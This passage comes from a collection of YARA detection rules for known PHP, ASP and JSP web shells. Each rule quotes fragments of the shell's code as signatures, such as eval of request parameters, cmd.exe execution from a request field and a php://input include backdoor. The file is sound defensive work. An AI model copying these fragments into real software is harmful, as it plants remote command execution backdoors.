        fingerprint = "v1_sha256_3db951af36ed3d08bc10b4c3fc2e67481f005580fb76f66b6ec5789ed6e2efdb"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 404.asp"
        category = "INFO"
        hash = "d9fa1e8513dbf59fa5d130f389032a2d"

    strings:
        $s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2"
    condition:
        all of them
}
rule webshell_webshell_cnseay02_1 {
    meta:
        id = "1ZLDUdpG2HSdnV0QWJ1WAl"
        fingerprint = "v1_sha256_9950fb7c26dfb25665093dbcf5c4a9dcf65466783509a3caa11c2c96d177d855"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file webshell-cnseay02-1.php"
        category = "INFO"
        hash = "95fc76081a42c4f26912826cb1bd24b1"

    strings:
        $s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU"
    condition:
        all of them
}
rule webshell_php_fbi {
    meta:
        id = "71uQRl7ybvTJsmZbRjzqX7"
        fingerprint = "v1_sha256_de8584ae83ee3e23f4ce00ccd73f75b4568d6a4544af45b83784a9a0c34d42e3"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file fbi.php"
        category = "INFO"
        hash = "1fb32f8e58c8deb168c06297a04a21f1"

    strings:
        $s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo"
    condition:
        all of them
}
rule webshell_B374kPHP_B374k {
    meta:
        id = "1eJNoio29JkApOpBoNxnYY"
        fingerprint = "v1_sha256_1f0fc5e309dd67a11d6ba9b698fd9ca3c7e6616545c220de79aaa3b63f0ad931"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file B374k.php"
        category = "INFO"
        hash = "bed7388976f8f1d90422e8795dff1ea6"

    strings:
        $s0 = "Http://code.google.com/p/b374k-shell" fullword
        $s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'"
        $s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
        $s4 = "B374k Vip In Beautify Just For Self" fullword
    condition:
        1 of them
}
rule webshell_cmd_asp_5_1 {
    meta:
        id = "1h84aIJ0jAhHxfofO9e58W"
        fingerprint = "v1_sha256_1ff4ae8c08cec4605594e97d6c077d4808d3a73c04ddf6a51952252dd2d01cf4"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cmd-asp-5.1.asp"
        category = "INFO"
        hash = "8baa99666bf3734cbdfdd10088e0cd9f"

    strings:
        $s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
    condition:
        all of them
}
rule webshell_php_dodo_zip {
    meta:
        id = "7L82FnHddaoB02QFweG5hg"
        fingerprint = "v1_sha256_bdeffafdedeadaba36c5c67f981c42d6111b954622780b930e9eeb9956c638b5"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file zip.php"
        category = "INFO"
        hash = "b7800364374077ce8864796240162ad5"

    strings:
        $s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x"
        $s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
    condition:
        all of them
}
rule webshell_aZRaiLPhp_v1_0 {
    meta:
        id = "1d3xQnFWUgnnQ61mpC1TMX"
        fingerprint = "v1_sha256_d0ccf9e37e378db4523d7918b30cff358115e7a4c36fad55a75f3aff218563c6"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file aZRaiLPhp v1.0.php"
        category = "INFO"
        hash = "26b2d3943395682e36da06ed493a3715"

    strings:
        $s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($"
        $s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo"
    condition:
        all of them
}
rule webshell_php_list {
    meta:
        id = "7GSu5M2BJWLoSeZ9QkeYfE"
        fingerprint = "v1_sha256_007f9307493bca71dcbdcf6ba6c45bf36899e8f636ccbd09c26453cb0aea0847"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file list.php"
        category = "INFO"
        hash = "922b128ddd90e1dc2f73088956c548ed"

    strings:
        $s1 = "// list.php = Directory & File Listing" fullword
        $s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena"
        $s9 = "// by: The Dark Raver" fullword
    condition:
        1 of them
}
rule webshell_ironshell {
    meta:
        id = "1eugTmtGfFdBo2nkH9Frbe"
        fingerprint = "v1_sha256_7e4916010a33383cfc3cbbcd5d575ac2f3a579220b66bd07e3121f3db30da66d"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file ironshell.php"
        category = "INFO"
        hash = "8bfa2eeb8a3ff6afc619258e39fded56"

    strings:
        $s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\""
        $s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di"
    condition:
        all of them
}
rule webshell_caidao_shell_404 {
    meta:
        id = "6M0h5YNthDrqI4uSHmOQk5"
        fingerprint = "v1_sha256_0743d18bc5066c96cca8cc0883971d3bc876e6c2fbb996e55b6930c715e07395"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 404.php"
        category = "INFO"
        hash = "ee94952dc53d9a29bdf4ece54c7a7aa7"

    strings:
        $s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St"
    condition:
        all of them
}
rule webshell_ASP_aspydrv {
    meta:
        id = "7faSXC3vizWAJWHJtGrPG8"
        fingerprint = "v1_sha256_a4a6205ace49778ddc421b0f0e65c576e2ffe40ce2ab84debb939d5324420405"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file aspydrv.asp"
        category = "INFO"
        hash = "de0a58f7d1e200d0b2c801a94ebce330"

    strings:
        $s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi"
    condition:
        all of them
}
rule webshell_jsp_web {
    meta:
        id = "4H70XfZbpVlcv0gnJ5DAvl"
        fingerprint = "v1_sha256_ed0ace0ba5f8a9e763353c42e3e3a39da10596e8517aad33e5c5080b44e4d61a"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file web.jsp"
        category = "INFO"
        hash = "4bc11e28f5dccd0c45a37f2b541b2e98"

    strings:
        $s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request."
    condition:
        all of them
}
rule webshell_mysqlwebsh {
    meta:
        id = "1W31JiPRFZfzJ7mnOINVU4"
        fingerprint = "v1_sha256_365d19c086b3bbb98cbe1e1ed1e7522ce98dc2614a39c747717c277cebef33d2"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file mysqlwebsh.php"
        category = "INFO"
        hash = "babfa76d11943a22484b3837f105fada"

    strings:
        $s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#"
    condition:
        all of them
}
rule webshell_jspShell {
    meta:
        id = "3eEXujGGJEdltaHtrbnjrr"
        fingerprint = "v1_sha256_058ddd64b142cada7144b9befa81ada314b72e6f23524d98efcb10136c23ed33"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file jspShell.jsp"
        category = "INFO"
        hash = "0d5b5a17552254be6c1c8f1eb3a5fdc1"

    strings:
        $s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on"
        $s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;"
    condition:
        all of them
}
rule webshell_Dx_Dx {
    meta:
        id = "531ctAy9NaEwRxlBE4LdNU"
        fingerprint = "v1_sha256_c2eddf58b25caff79460ab9a87ac0573d483866a87c1b1ec0984afce2c22b29f"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Dx.php"
        category = "INFO"
        hash = "9cfe372d49fe8bf2fac8e1c534153d9b"

    strings:
        $s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
        $s9 = "class=linelisting><nobr>POST (php eval)</td><"
    condition:
        1 of them
}
rule webshell_asp_ntdaddy {
    meta:
        id = "3cEpq6PFCKmP9Stt8GzjKv"
        fingerprint = "v1_sha256_7237eb7233c6affcc1f67a764f704b7d7e1d13f71c64893286c6c99318cc7c3e"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file ntdaddy.asp"
        category = "INFO"
        hash = "c5e6baa5d140f73b4e16a6cfde671c68"

    strings:
        $s9 =  "if  FP  =  \"RefreshFolder\"  or  "
        $s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  "
    condition:
        1 of them
}
rule webshell_MySQL_Web_Interface_Version_0_8 {
    meta:
        id = "CxVZfsCiZQf7ag2gcQPW3"
        fingerprint = "v1_sha256_680d4368804ad21e46dbe400563beca3ef724711b5432dccce1276ecadc04f2c"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file MySQL Web Interface Version 0.8.php"
        category = "INFO"
        hash = "36d4f34d0a22080f47bb1cb94107c60f"

    strings:
        $s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>"
    condition:
        all of them
}
rule webshell_elmaliseker_2 {
    meta:
        id = "2M61rjn3BthfnunIfYzKhk"
        fingerprint = "v1_sha256_ca300cd142b3c8b820d3b5f5a56eeb834d9acb1d85916b932bd67fb4a25f4ed0"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file elmaliseker.asp"
        category = "INFO"
        hash = "b32d1730d23a660fd6aa8e60c3dc549f"

    strings:
        $s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx"
        $s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but"
    condition:
        all of them
}
rule webshell_ASP_RemExp {
    meta:
        id = "40RQYP6SdZgdn4h0Da356D"
        fingerprint = "v1_sha256_7a3b35c4a16f26167180cea81f67de101edabb9b35479f7e5acae7f3fe07f304"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file RemExp.asp"
        category = "INFO"
        hash = "aa1d8491f4e2894dbdb91eec1abc2244"

    strings:
        $s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques"
        $s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal"
    condition:
        all of them
}
rule webshell_jsp_list1 {
    meta:
        id = "3tt2NfDtDudUijwKo8jbBn"
        fingerprint = "v1_sha256_61ecafe477d98c5eb6887a9ff50960fc28b84512d09a36c02588159b08b395a4"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file list1.jsp"
        category = "INFO"
        hash = "8d9e5afa77303c9c01ff34ea4e7f6ca6"

    strings:
        $s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive"
        $s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\""
    condition:
        all of them
}
rule webshell_phpkit_1_0_odd {
    meta:
        id = "1QLX1C3oeleilJ1mbLAg9P"
        fingerprint = "v1_sha256_bf99d6a71b9ef72574d928a09f3a479f2f819287d78c9a5435e45752e76a59bf"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file odd.php"
        category = "INFO"
        hash = "594d1b1311bbef38a0eb3d6cbb1ab538"

    strings:
        $s0 = "include('php://input');" fullword
        $s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
        $s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
    condition:
        all of them
}
rule webshell_jsp_123 {
    meta:
        id = "2SbsFRxEtRuBt7eJ2ITnOL"
        fingerprint = "v1_sha256_48925d3a302bf09ecb3f031301ca8afc722c7ef53b87efa27a3c4b58ee15217d"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 123.jsp"
        category = "INFO"
        hash = "c691f53e849676cac68a38d692467641"

    strings:
        $s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7"
        $s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
        $s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword
    condition:
        all of them
}
rule webshell_asp_1 {
    meta:
        id = "3x2odaCgRhQr6opRq9PUND"
        fingerprint = "v1_sha256_9cae40c8fc3966942a8fc3ee0f5d07081ba2d1c1c3156144488ba64015d6838b"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 1.asp"
        category = "INFO"
        hash = "8991148adf5de3b8322ec5d78cb01bdb"

    strings:
        $s4 = "!22222222222222222222222222222222222222222222222222" fullword
        $s8 = "<%eval request(\"pass\")%>" fullword
    condition:
        all of them
}
rule webshell_ASP_tool {
    meta:
        id = "59RYSJ7hCctsHGZFg9jZrB"
        fingerprint = "v1_sha256_62ba39bac09cb403a47678cd38c519642cc3c20f43c470b828ec448c42e9bb73"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file tool.asp"
        category = "INFO"
        hash = "4ab68d38527d5834e9c1ff64407b34fb"

    strings:
        $s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\""
        $s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" "
        $s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas"
    condition:
        2 of them
}
rule webshell_cmd_win32 {
    meta:
        id = "4VOtkipOES8BqIKuopbpek"
        fingerprint = "v1_sha256_b90ba15b7b2c557f7b2303695b7f1f737f63df06d712c89e0cfea51c7d37e21d"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cmd_win32.jsp"
        category = "INFO"
        hash = "cc4d4d6cc9a25984aa9a7583c7def174"

    strings:
        $s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam"
        $s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
    condition:
        2 of them
}
rule webshell_jsp_jshell {
    meta:
        id = "68IR35hS59mkRbavwRaDZj"
        fingerprint = "v1_sha256_dfe3ac097de4ca406ab7ec967fdc03d1e87c74f84fc675b58438a842d80cccda"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file jshell.jsp"
        category = "INFO"
        hash = "124b22f38aaaf064cef14711b2602c06"

    strings:
        $s0 = "kXpeW[\"" fullword
        $s4 = "[7b:g0W@W<" fullword
        $s5 = "b:gHr,g<" fullword
        $s8 = "RhV0W@W<" fullword
        $s9 = "S_MR(u7b" fullword
    condition:
        all of them
}
rule webshell_ASP_zehir4 {
    meta:
        id = "4Nm2T181CswpkEFDDZDPHs"
        fingerprint = "v1_sha256_aa3e07ee6369dd5f86f28a53c8e45391de718d4935021339a7b47829b5196f54"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file zehir4.asp"
        category = "INFO"
        hash = "7f4e12e159360743ec016273c3b9108c"

    strings:
        $s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/"
    condition:
        all of them
}
rule webshell_wsb_idc {
    meta:
        id = "4re80uGoWUVsV1hbSMMfFG"
        fingerprint = "v1_sha256_f274061f1a02ab65bc574a6586343f74262a463c5200cd2c231a752f54967404"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file idc.php"
        category = "INFO"
        hash = "7c5b1b30196c51f1accbffb80296395f"

    strings:
        $s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
        $s3 = "{eval($_GET['idc']);}" fullword
    condition:
        1 of them
}
rule webshell_cpg_143_incl_xpl {
    meta:
        id = "4DX4yPTrUzXYVgc4vevz7U"
        fingerprint = "v1_sha256_7c2ce25c33e167761d72331d7c4d4f7cd6029ee0caf6e2008df8b12894faaaf8"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cpg_143_incl_xpl.php"
        category = "INFO"
        hash = "5937b131b67d8e0afdbd589251a5e176"

    strings:
        $s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA"
        $s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time"
    condition:
        1 of them
}
rule webshell_mumaasp_com {
    meta:
        id = "6bu0pDpA2aDnFvPU0LJFKi"
        fingerprint = "v1_sha256_75e2a056782190e9914264b9e34002faea75a35ab0f97bf1e05dec15432d064c"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file mumaasp.com.asp"
        category = "INFO"
        hash = "cce32b2e18f5357c85b6d20f564ebd5d"

    strings:
        $s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR"
    condition:
        all of them
}
rule webshell_php_404 {
    meta:
        id = "1cQnQB0ktMmPYd8jxmj14k"
        fingerprint = "v1_sha256_3fc928e6edda8fdc4220f57215db61b7fbf8de5b00423b219a173c8ecde40b79"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 404.php"
        category = "INFO"
        hash = "ced050df5ca42064056a7ad610a191b3"

    strings:
        $s0 = "$pass = md5(md5(md5($pass)));" fullword
    condition:
        all of them
}
rule webshell_webshell_cnseay_x {
    meta:
        id = "5XKHYY1fXqAhBruVCosQZg"
        fingerprint = "v1_sha256_59cb8b8a5873b716a25096c7b12f09293a812b63f31fea07d919b9c4d2bc9a19"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file webshell-cnseay-x.php"
        category = "INFO"
        hash = "a0f9f7f5cd405a514a7f3be329f380e5"

    strings:
        $s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_"
    condition:
        all of them
}
rule webshell_asp_up {
    meta:
        id = "6dTMQoaO31zaucXQlyrDoU"
        fingerprint = "v1_sha256_dff2896d2226ade08e74147121a0e0036e8545dfff36b48b5a0771c9c7d537e9"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file up.asp"
        category = "INFO"
        hash = "f775e721cfe85019fe41c34f47c0d67c"

    strings:
        $s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio"
        $s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword
    condition:
        1 of them
}
rule webshell_phpkit_0_1a_odd {
    meta:
        id = "5Nc6cRZ8lSe2lSGgJESXn0"
        fingerprint = "v1_sha256_745734658ed4000e1399531ae44125f8462ecd37388e6223cfa9bf91dbb52bbc"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file odd.php"
        category = "INFO"
        hash = "3c30399e7480c09276f412271f60ed01"

    strings:
        $s1 = "include('php://input');" fullword
        $s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
        $s4 = "// uses include('php://input') to execute arbritary code" fullword
        $s5 = "// php://input based backdoor" fullword
    condition:
        2 of them
}
rule webshell_ASP_cmd {
    meta:
        id = "7SV4cXugDigcWKW1KxKZUw"
        fingerprint = "v1_sha256_c1353e43876e18f18638a558a29a12d6e82603641fedd81b042adca91fea0d18"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cmd.asp"
        category = "INFO"
        hash = "97af88b478422067f23b001dd06d56a9"

    strings:
        $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
    condition:
        all of them
}
rule webshell_PHP_Shell_x3 {
    meta:
        id = "4PasyYn0F8W0LyjGA2VrrO"
        fingerprint = "v1_sha256_7361a7eecf345b9c1809294b6b081db8769805ec3e6c656adc4ac87261193683"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file PHP Shell.php"
        category = "INFO"
        hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"

    strings:
        $s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
        $s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
        $s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset("
    condition:
        2 of them
}
rule webshell_PHP_g00nv13 {
    meta:
        id = "5qitoXmGk8guy6CMm5vYAA"
        fingerprint = "v1_sha256_dd9f03a7ad0d2b73f7a8602ab267e0e8e5cb1f9250f9a25c86ded3797df2f8d5"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file g00nv13.php"
        category = "INFO"
        hash = "35ad2533192fe8a1a76c3276140db820"

    strings:
        $s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas"
        $s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p"
    condition:
        all of them
}
rule webshell_php_h6ss {
    meta:
        id = "2p7zFPsbw2a7y8kkGVOUIe"
        fingerprint = "v1_sha256_c4001be111ff271335dd65c15c59da979a8e202bcf58a7f10de7f03644472153"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file h6ss.php"
        category = "INFO"
        hash = "272dde9a4a7265d6c139287560328cd5"

    strings:
        $s0 = "<?php eval(gzuncompress(base64_decode(\""
    condition:
        all of them
}
rule webshell_jsp_zx {
    meta:
        id = "3wL7hyrBZiW2H6eFQjxN9v"
        fingerprint = "v1_sha256_d97df624801d0f24141dfe7074d290a56e639af7d867c907362ff4434c3eeac0"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file zx.jsp"
        category = "INFO"
        hash = "67627c264db1e54a4720bd6a64721674"

    strings:
        $s0 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g"
    condition:
        all of them
}
rule webshell_Ani_Shell {
    meta:
        id = "VKz1lxEtxvRNwZE0PMNP4"
        fingerprint = "v1_sha256_c8caf8686c36a41b5aae093e88b8872350cf625c59a14389c5df93f284c8f05a"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Ani-Shell.php"
        category = "INFO"
        hash = "889bfc9fbb8ee7832044fc575324d01a"

    strings:
        $s0 = "$Python_CODE = \"I"
        $s6 = "$passwordPrompt = \"\\n================================================="
        $s7 = "fputs ($sockfd ,\"\\n==============================================="
    condition:
        1 of them
}
rule webshell_jsp_k8cmd {
    meta:
        id = "2MLvL0PhL0P4qmZVj4N2gd"
        fingerprint = "v1_sha256_e523a5b1118c6f4d5798f130c00466c7945d27a6fbe0d4cb3a40b7f36da2a502"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file k8cmd.jsp"
        category = "INFO"
        hash = "b39544415e692a567455ff033a97a682"

    strings:
        $s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword
    condition:
        all of them
}
rule webshell_jsp_cmd {
    meta:
        id = "3oGIIirdFDvQk6KtwaqRyK"
        fingerprint = "v1_sha256_e48d4e2d14a3605fd9dda03630820a0fb53d893cc4d283739fde11f9ab7d9d1e"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cmd.jsp"
        category = "INFO"
